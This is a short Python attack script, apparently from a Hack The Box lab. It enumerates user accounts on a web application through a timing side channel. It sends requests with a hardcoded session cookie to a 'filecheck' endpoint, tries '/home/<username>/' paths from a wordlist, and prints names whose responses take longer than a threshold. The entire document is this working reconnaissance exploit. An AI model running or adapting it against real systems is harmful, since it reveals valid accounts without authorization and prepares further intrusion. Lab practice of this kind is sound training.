import requests

URL = "http://172.17.0.2:1337/filecheck"
cookies = {"session": "eyJsb2dnZWRfaW4iOnRydWUsInVzZXIiOiJodGItc3RkbnQifQ.ZCh4Qw.Lv94ak_WPWEN8Idhwf7l-3a5MH4"}
THRESHOLD_S = 0.02
WORDLIST = "./a.txt"


with open(WORDLIST, 'r') as f:
    for username in f:
        username = username.strip()
        r = requests.get(URL, params={"filepath": f"/home/{username}/"}, cookies=cookies)

        if r.elapsed.total_seconds() > THRESHOLD_S:
            print(f"{username}")